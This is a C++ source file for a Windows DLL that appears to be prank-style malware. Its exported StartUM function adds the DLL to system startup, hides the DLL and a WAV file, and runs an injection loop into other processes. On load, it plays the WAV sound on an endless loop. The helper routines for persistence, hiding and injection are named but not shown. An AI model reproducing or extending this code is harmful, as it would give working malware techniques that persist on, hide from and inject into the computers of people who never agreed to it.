#include"UM.h"

char* GetCurrentDllPath() {
    HMODULE hModule = NULL;

    // Get handle of the module (the DLL) from the address of this function
    if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | 
                          GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                          (LPCSTR)GetCurrentDllPath, &hModule)) {
        char* path = (char*)malloc(MAX_PATH);
        // Retrieve the full path of the module
        if (GetModuleFileName(hModule, path, MAX_PATH) != 0) {
            return path; // Return as std::string
        }
    }
    return 0;
}



extern "C" __declspec(dllexport) void StartUM(){
    char* dllPath = GetCurrentDllPath();
    char* UMPath = "C:\\Users\\User\\Favorites\\UM.wav";
    AddDllToStartup(dllPath);
    HideDllFile(dllPath);
    HideDllFile(UMPath);
    injectionLoop(dllPath);
}

DWORD WINAPI StartFunction(LPVOID lpParam){
    PlaySound(TEXT("C:\\Users\\User\\Favorites\\UM.wav"), NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH: {
           
            if(!isRundll32()){
                CreateThread(NULL, 0, StartFunction, NULL, 0, NULL);
            }
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}